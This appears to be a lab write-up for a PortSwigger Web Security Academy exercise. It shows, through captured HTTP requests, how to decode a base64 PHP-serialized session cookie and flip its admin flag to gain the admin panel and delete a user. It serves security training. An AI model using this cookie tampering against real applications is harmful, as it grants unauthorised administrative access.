### Modifying serialized objects

Enter Credential in Login Form.

![Login Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Insecure-deserialization/ID-1.png)

Capture the Request Using Burp Suite.

```
POST /login HTTP/1.1
Host: acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net
DNT: 1
Connection: close
Referer: https://acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net/login
Cookie: session=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

username=wiener&password=peter

```

After Login we will be redirect to my-account and assign cookie base64 Serialized object.
Lets Decode it and modify it.

```
GET /my-account HTTP/1.1
Host: acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net/login
DNT: 1
Connection: close
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

```

After modifying the session cookie
just change boolean value of admin to 1.

```
GET /my-account HTTP/1.1
Host: acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acf61f251eecb4b2c0ee0f960029001f.web-security-academy.net/login
DNT: 1
Connection: close
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

```

After modifying we will redirect to admin page.
Show in below
just Delete user carlos and lab will be solved.

![Admin Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/Portswigger/images/Insecure-deserialization/ID-2.png)

---
